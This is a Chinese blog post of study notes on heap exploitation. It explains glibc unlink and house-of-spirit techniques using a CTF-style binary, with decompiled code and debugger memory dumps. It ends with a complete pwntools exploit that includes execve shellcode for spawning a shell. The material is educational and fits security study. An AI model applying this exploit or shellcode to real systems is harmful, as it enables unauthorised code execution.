<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>堆漏洞总结 | BOBpenのStudio</title>
  <meta name="author" content="BOBpen">
  
  <meta name="description" content="Just Do It Anyway">
  
  
  <meta property="og:title" content="堆漏洞总结"/>
  <meta property="og:site_name" content="BOBpenのStudio"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta property="og:image" content=""/>
  
   <link rel="apple-touch-icon" href="/icon.png" />
   <link rel="shortcut icon" href="/favicon.png" >
   <link rel="alternate" href="http://xxx.xx/atom.xml" title="BOBpenのStudio" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
</head>


<body>
  <div id="content" class="inner">
    <aside id="sidebar" class="alignleft">
      <div class="navigationBar">
        <a href="/">BOBpenのStudio</a>
      </div>
    	
  <nav class="widget" id="menu">
	<ul>
    
      <li class="cell"><a class="next" href="/">Home</a><li>
    
      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
    
      <li class="cell"><a class="next" href="/about/">About</a><li>
    
      <li class="cell"><a class="next" href="/atom.xml">Subscribe</a><li>
    
    </ul>
</nav>

  <div class="widget weibo">
<iframe width="100%" height="100" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=110&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=0&isWeibo=0&isFans=0&uid=&verifier=78e1ee4d&colors=ffffff,ffffff,999,000,ecfbfd&dpc=1"></iframe>
</div>

  

  

    	<footer id="footer" class="inner"><div class="copyright">
  
  &copy; 2018 BOBpen
  
</div>



</footer>
    </aside>
    
    
    <div id="hidden-navigationBar" class="navigationBar">
      <a href="/">BOBpenのStudio</a>
    </div>
    <div id="main-col" class="alignright">
    <div id="wrapper">
      
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title">堆漏洞总结</h1>
  

      <time datetime="2018-01-25T12:49:54.000Z"><a href="/2018/01/25/堆 /">2018-01-25</a></time>
      
  </header>
    <div class="entry">
      
        <h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>这是个堆漏洞简单总结笔记</p>
<p><a href="http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="external">unlink利用</a></p>
<p><a href="https://etenal.me/archives/1121" target="_blank" rel="external">堆系列漏洞</a></p>
<h2 id="0x01-unlink"><a href="#0x01-unlink" class="headerlink" title="0x01-unlink"></a>0x01-unlink</h2><ul>
<li>利用unlink达到任意写的目的</li>
<li>关键步骤</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p-&gt;fd=ptr-0x18</div><div class="line">p-&gt;bk=ptr-0x10</div></pre></td></tr></table></figure>
<p>触发unlink宏</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1.FD=p-&gt;fd(实际是ptr-0x18)</div><div class="line">2.BK=p-&gt;bk(实际是ptr-0x10)</div><div class="line">3.检查是否满足上文所示的限制，由于FD-&gt;bk和BK-&gt;fd均为*ptr(即p)，由此可以过掉这个限制</div><div class="line">4.FD-&gt;bk=BK</div><div class="line">5.BK-&gt;fd=FD(p=ptr-0x18)</div></pre></td></tr></table></figure>
<h2 id="0x02-例子"><a href="#0x02-例子" class="headerlink" title="0x02-例子"></a>0x02-例子</h2><p>一个常见的可以create，delete，edit的程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">int create()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  char buf; // [rsp+0h] [rbp-90h]</div><div class="line">  void *dest; // [rsp+80h] [rbp-10h]</div><div class="line">  int ID; // [rsp+88h] [rbp-8h]</div><div class="line">  size_t size; // [rsp+8Ch] [rbp-4h]</div><div class="line"></div><div class="line">  result = number;</div><div class="line">  if ( number &lt;= 4 )</div><div class="line">  &#123;</div><div class="line">    puts(&quot;Input size&quot;);</div><div class="line">    result = atoi_input();</div><div class="line">    LODWORD(size) = result;</div><div class="line">    if ( result &lt;= 4096 )</div><div class="line">    &#123;</div><div class="line">      puts(&quot;Input cun&quot;);</div><div class="line">      result = atoi_input();</div><div class="line">      ID = result;</div><div class="line">      if ( result &lt;= 4 )</div><div class="line">      &#123;</div><div class="line">        dest = malloc((signed int)size);</div><div class="line">        puts(&quot;Input content&quot;);</div><div class="line">        if ( (signed int)size &gt; 112 )</div><div class="line">        &#123;</div><div class="line">          read(0, dest, (unsigned int)size);</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">        &#123;</div><div class="line">          read(0, &amp;buf, (unsigned int)size);</div><div class="line">          memcpy(dest, &amp;buf, (signed int)size);</div><div class="line">        &#125;</div><div class="line">        *(_DWORD *)(qword_6020C0 + 4LL * ID) = size;</div><div class="line">        *((_QWORD *)&amp;unk_6020E0 + 2 * ID) = dest;</div><div class="line">        dword_6020E8[4 * ID] = 1;</div><div class="line">        ++number;</div><div class="line">        result = fflush(stdout);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个是ida下create的部分</p>
<ul>
<li>NOTE</li>
</ul>
<ol>
<li>LODWORD()取低字节，一般是32位和64位之间的</li>
<li>atoi_input()，atoi会只截取字符串的数字部分</li>
<li><em>((_QWORD </em>)&amp;unk_6020E0 + 2 * ID) = dest;可以看chunk在6020e0出有一个存放申请到的指针的数组，这是一个关键</li>
<li>最终因为存放全局数组的指针存在很容易修改<br>因为</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">**保存相关堆信息的结构数组**</div><div class="line">gdb-peda$ x/10gx 0x6020e0</div><div class="line">0x6020e0:第0块的地址 第0块是否使用的flag</div><div class="line">0x6020f0:第1块的地址 第1块是否使用的flag</div><div class="line">0x602100:第2块的地址 第2块是否使用的flag</div><div class="line">0x602110:第3块的地址 第3块是否使用的flag</div><div class="line">0x602120:0x0000000000000000 0x0000000000000000</div><div class="line"></div><div class="line">0x下两个16进制位占用一个储存单元，所以一行过去就是16个，就是相差0x10，</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/10gx 0x6020e0</div><div class="line">0x6020e0:0x0000000001e8c060 0x0000000000000001</div><div class="line">0x6020f0:0x0000000001e8c1a0 0x0000000000000000</div><div class="line">0x602100:0x00000000006020e8 0x0000000000000001</div><div class="line">0x602110:0x0000000000000000 0x0000000000000000</div><div class="line">0x602120:0x0000000000000000 0x0000000000000000</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/10gx 0x6020e0</div><div class="line">0x6020e0:0x0000000001e8c060 0x0000000000000001</div><div class="line">0x6020f0:      free-got     0x0000000000000000</div><div class="line">0x602100:0x00000000006020e8 0x0000000000000001</div><div class="line">0x602110:0x0000000000000000 0x0000000000000000</div><div class="line">0x602120:0x0000000000000000 0x0000000000000000</div></pre></td></tr></table></figure>
<p>可以看到0x602100指向了0x602100-0x18=0x6020e8处，所以edit第二块chunk，就会从0x6020e8开始写，从而可以覆盖已保存的指针，因为edit部分代码是根据这里保存的数据来修改的，所以<strong>就可以修改到覆盖过的free-got</strong>，从而达到改got的目的！</p>
<p>参考:–<a href="https://bbs.pediy.com/thread-220799.htm" target="_blank" rel="external">链接</a></p>
<h2 id="0x03-house-of-spirit"><a href="#0x03-house-of-spirit" class="headerlink" title="0x03  house-of-spirit"></a>0x03  house-of-spirit</h2><p><strong>要点：</strong></p>
<ul>
<li>能通过栈溢出覆盖chunk指针</li>
<li>free该chunk</li>
<li>再malloc同样大小</li>
<li>可编辑该chunk，写入数据</li>
</ul>
<p>一般情况下是有一个可输入的字符串数组，可构造shellcode，同时，栈上还保存着malloc的指针，还需要一些栈的可输入数据，来伪造size等字段，以达到伪造chunk的目的。</p>
<p><img src="https://ohpjrz0l7.qnssl.com/wp-content/uploads/2017/03/stack.png" alt=""></p>
<p><img src="https://ohpjrz0l7.qnssl.com/wp-content/uploads/2017/03/overflow.png" alt=""></p>
<p>如图中。</p>
<ol>
<li>name字符串数组可以溢出到指针 ptr1</li>
<li>篡改 ptr1 为0xbffffdf0，同时free</li>
<li>程序中一般可控制再malloc，此时malloc相同大小的chunk，并利用 <strong>localage</strong> 伪造size，以通过chunk的检查，</li>
<li>成功malloc到 0xbffffdf0 </li>
<li>修改ret</li>
<li>控制eip执行shellcode，</li>
</ol>
<h2 id="0x04-例子"><a href="#0x04-例子" class="headerlink" title="0x04 -例子"></a>0x04 -例子</h2><p><img src="https://p5.ssl.qhimg.com/t01c166de9ca66095ad.png" alt=""></p>
<p>首先程序会有一个off by one 漏洞，从而可以print出rbp，这是作为之后的一个基准地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">data = shellcode.ljust(46, &apos;a&apos;)</div><div class="line">data += &apos;bb&apos;</div><div class="line">p.send(data)</div><div class="line">p.recvuntil(&apos;bb&apos;)</div><div class="line">rbp_addr = p.recvuntil(&apos;, w&apos;)[:-3]</div><div class="line">rbp_addr = u64(rbp_addr.ljust(8,&apos;\x00&apos;))</div><div class="line">print hex(rbp_addr)</div></pre></td></tr></table></figure>
<p>得到rbp的地址<br>attach 调试</p>
<p><img src="https://p1.ssl.qhimg.com/t01df14ac885c84a996.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">0c:0060│      0x7fffffffe198 —▸ 0x7ffff7a57b00 (atoi+16) ◂— add    rsp, 8</div><div class="line">0d:0068│      0x7fffffffe1a0 ◂— 9 /* &apos;\t&apos; */</div><div class="line">0e:0070│      0x7fffffffe1a8 —▸ 0x4008b5 ◂— leave  </div><div class="line">0f:0078│      0x7fffffffe1b0 ◂— 0x7fffff003635 /* &apos;56&apos; */</div><div class="line">10:0080│      0x7fffffffe1b8 —▸*0x603260* ◂— 0x7fff0a647361</div><div class="line">11:0088│      0x7fffffffe1c0 —▸ 0x7fffffffe220 —▸ 0x7fffffffe240 —▸ 0x400b60 ◂— push   r15</div><div class="line">12:0090│      0x7fffffffe1c8 —▸ 0x400b34 ◂— leave  </div><div class="line">13:0098│      0x7fffffffe1d0 —▸ 0x7ffff7dcf420 (_IO_file_jumps) ◂— add    byte ptr [rax], al</div><div class="line">14:00a0│      0x7fffffffe1d8 —▸ 0x7ffff7a99ef9 (_IO_file_setbuf+9) ◂— test   rax, rax</div><div class="line">15:00a8│      0x7fffffffe1e0 ◂— 0x2</div><div class="line">16:00b0│      0x7fffffffe1e8 ◂— 0x38 /* &apos;8&apos; */</div><div class="line">17:00b8│      0x7fffffffe1f0 ◂— 0x6461 /* &apos;ad&apos; */</div><div class="line">18:00c0│      0x7fffffffe1f8 ◂— 0x0</div><div class="line">19:00c8│      *0x7fffffffe200* —▸ 0x7fffffffe220 —▸ 0x7fffffffe240 —▸ 0x400b60 ◂— push   r15</div><div class="line">1a:00d0│      0x7fffffffe208 —▸ 0x4006b0 ◂— xor    ebp, ebp</div><div class="line">1b:00d8│      0x7fffffffe210 —▸ 0x7fffffffe320 ◂— 0x1</div><div class="line">1c:00e0│      0x7fffffffe218 —▸ 0x4007dd ◂— pop    rbp</div><div class="line">1d:00e8│      0x7fffffffe220 —▸ 0x7fffffffe240 —▸ 0x400b60 ◂— push   r15</div><div class="line">1e:00f0│      0x7fffffffe228 —▸ 0x400b59 ◂— mov    eax, 0</div><div class="line">1f:00f8│      0x7fffffffe230 —▸ 0x7fffffffe328 —▸ 0x7fffffffe609 ◂— &apos;/root/pwn200&apos;</div><div class="line">20:0100│      0x7fffffffe238 ◂— 0x100000000</div><div class="line">21:0108│      0x7fffffffe240 —▸ 0x400b60 ◂— push   r15</div><div class="line">22:0110│      0x7fffffffe248 —▸ 0x7ffff7a42f2a (__libc_start_main+234) ◂— mov    edi, eax</div></pre></td></tr></table></figure>
<p>看到 <strong>0x7fffffffe1b8</strong> 是存放dest的，所以有如下思路：</p>
<ul>
<li>溢出buf，覆盖dest指针</li>
<li>溢出的过程中，可以构造size</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0e:0070│      0x7fffd28bde28 ◂— 0x41 /* &apos;A&apos; */</div><div class="line">0f:0078│      0x7fffd28bde30 ◂— 0x0</div><div class="line">10:0080│      0x7fffd28bde38 —▸ 0x7fffd28bde30 ◂— 0x0</div><div class="line">11:0088│      0x7fffd28bde40 —▸ 0x7fffd28bdea0 —▸ 0x7fffd28bdec0 —▸ 0x400b60 ◂— push   r15</div></pre></td></tr></table></figure>
<p>因为堆是从<strong>低地址</strong>向<strong>高地址</strong>生长的，所以可以看到，构造的size的0x41就是chunk头的第二部分，从而紧接着的地址 <strong>0x7fffd28bde30</strong> 就是返回的伪chunk指针， <strong>0x7fffd28bde38</strong> 是存放dest的地址，可以看到被溢出覆盖为 <strong>0x7fffd28bde30</strong>。这就可以在free之后，把 <strong>0x7fffd28bde30</strong> 申请出来了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">p.recvuntil(&apos;id ~~?&apos;)</div><div class="line">    p.sendline(&apos;32&apos;)</div><div class="line">    p.recvuntil(&apos;money~&apos;)</div><div class="line">    data = p64(0) * 5 + p64(0x41) # 伪造堆块的size</div><div class="line">    data = data.ljust(0x38, &apos;\x00&apos;) + p64(fake_addr) </div><div class="line">    # 覆盖堆指针 </div><div class="line">    p.send(data)</div><div class="line">    ##raw_input()</div><div class="line">    p.recvuntil(&apos;choice : &apos;)</div><div class="line">    p.sendline(&apos;2&apos;) # 释放伪堆块进入fastbin</div><div class="line">    p.recvuntil(&apos;choice : &apos;)</div><div class="line">    p.sendline(&apos;1&apos;)</div><div class="line">    p.recvuntil(&apos;long?&apos;)</div><div class="line">    p.sendline(&apos;48&apos;)</div><div class="line">    p.recvuntil(&apos;\n48\n&apos;) # 将伪堆块申请出来</div><div class="line">    data = &apos;a&apos; * 0x18 + p64(shellcode_addr) # 将eip修改为shellcode的地址</div><div class="line">~~~ </div><div class="line"></div><div class="line">因为</div><div class="line"></div><div class="line">![](/Users/linwei/blog/source/_posts/Jietu20180129-185317.jpg)</div><div class="line"></div><div class="line">可以看到 **0x7fffd28bde30** 和 ret 之间有 3个0x8的偏移，就是0x18 ，所以exp中，**先填充 0x18的padiing**，再 **覆盖ret为shellcode的地址**</div><div class="line"></div><div class="line"></div><div class="line">## 0x05-总结！！  ##</div><div class="line">* exp中的 **data = p64(0) * 5 + p64(0x41)** 在内存中 p64是占用8个字节，所以在内存中是</div></pre></td></tr></table></figure>
<p>pwndbg&gt; x/20gx 0x7fffd28bde00<br>0x7fffd28bde00:    0x0000000000000000    0x0000000000000000<br>0x7fffd28bde10:    0x0000000000000000    0x0000000000000000<br>0x7fffd28bde20:    0x0000000000000000    0x0000000000000041<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">即</div></pre></td></tr></table></figure></p>
<p>pwndbg&gt; x/20gx 0x7fffd28bde00<br>0x7fffd28bde00:            p64（0）              p64（0）<br>0x7fffd28bde10:            p64（0）              p64（0）<br>0x7fffd28bde20:            p64（0）              <em>size</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* 申请的大小为 48 ，因为 0x41 是包含**chunk头在内的大小**，所以实际大小是 **0x40 - 0x10(16) = 0x30 = 48**</div></pre></td></tr></table></figure></p>
<p>19:00c8│      0x7fffffffe200 —▸ 0x7fffffffe220 —▸ 0x7fffffffe240 —▸ 0x400b60 ◂— push   r15<br>1a:00d0│      0x7fffffffe208 —▸ 0x4006b0 ◂— xor    ebp, ebp<br>1b:00d8│      0x7fffffffe210 —▸ 0x7fffffffe320 ◂— 0x1<br>1c:00e0│      0x7fffffffe218 —▸ 0x4007dd ◂— pop    rbp<br>1d:00e8│      0x7fffffffe220 —▸ 0x7fffffffe240 —▸ 0x400b60 ◂— push   r15<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">~~~</div><div class="line">0x7fffffffe200 —▸ 0x7fffffffe220 = old_ebp</div><div class="line">0x7fffffffe220 —▸ 0x7fffffffe240 = older_ebp</div></pre></td></tr></table></figure></p>
<p>可以形象看到push ebp的操作</p>
<p>完整的exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">shellcode = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</div><div class="line"></div><div class="line">def pwn():</div><div class="line">    # gdb.attach(p, &quot;b *0x400991&quot;)</div><div class="line"></div><div class="line">    data = shellcode.ljust(46, &apos;a&apos;)</div><div class="line">    data += &apos;bb&apos;</div><div class="line">    p.send(data)</div><div class="line">    p.recvuntil(&apos;bb&apos;)</div><div class="line">    rbp_addr = p.recvuntil(&apos;, w&apos;)[:-3]</div><div class="line">    rbp_addr = u64(rbp_addr.ljust(8,&apos;\x00&apos;))</div><div class="line">    print hex(rbp_addr)</div><div class="line">    fake_addr = rbp_addr - 0x90</div><div class="line">    shellcode_addr = rbp_addr - 0x50</div><div class="line">    # 输入id伪造下一个堆块的size</div><div class="line">    p.recvuntil(&apos;id ~~?&apos;)</div><div class="line">    p.sendline(&apos;32&apos;)</div><div class="line">    p.recvuntil(&apos;money~&apos;)</div><div class="line">    data = p64(0) * 5 + p64(0x41) # 伪造堆块的size</div><div class="line">    data = data.ljust(0x38, &apos;\x00&apos;) + p64(fake_addr) # 覆盖堆指针 </div><div class="line">    p.send(data)</div><div class="line">    p.recvuntil(&apos;choice : &apos;)</div><div class="line">    p.sendline(&apos;2&apos;) # 释放伪堆块进入fastbin</div><div class="line">    p.recvuntil(&apos;choice : &apos;)</div><div class="line">    p.sendline(&apos;1&apos;)</div><div class="line">    p.recvuntil(&apos;long?&apos;)</div><div class="line">    p.sendline(&apos;48&apos;)</div><div class="line">    p.recvuntil(&apos;\n48\n&apos;) # 将伪堆块申请出来</div><div class="line">    data = &apos;a&apos; * 0x18 + p64(shellcode_addr) # 将eip修改为shellcode的地址</div><div class="line">    data = data.ljust(48, &apos;\x00&apos;)</div><div class="line">    p.send(data)</div><div class="line">    p.recvuntil(&apos;choice : &apos;)</div><div class="line">    p.sendline(&apos;3&apos;) # 退出返回时回去执行shellcode</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
<p><a href="http://pwn4.fun/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/" target="_blank" rel="external">参考1</a></p>
<p><a href="https://www.anquanke.com/post/id/85357#mao" target="_blank" rel="external">参考2</a></p>

	 
	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
<span>Posted by <a style="color:#9f9f9f;" href=""><strong></strong></a> - 2018-01-25</span><br />
<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://yoursite.com"><strong>BOBpenのStudio</strong></a></span>
</p>
       	 
      
    </div>
    <footer>
      
	 
     		  
       		
     		  
       	 
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


</div>
    </div>
    <div class="tabbar" onload="divideTabBar()">
	
      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
    
      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
    
      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
    
      <div class="tabbaritem"><a class="next" href="/atom.xml">Subscribe</a></div>
    
</div>


  </div>
</body>
</html>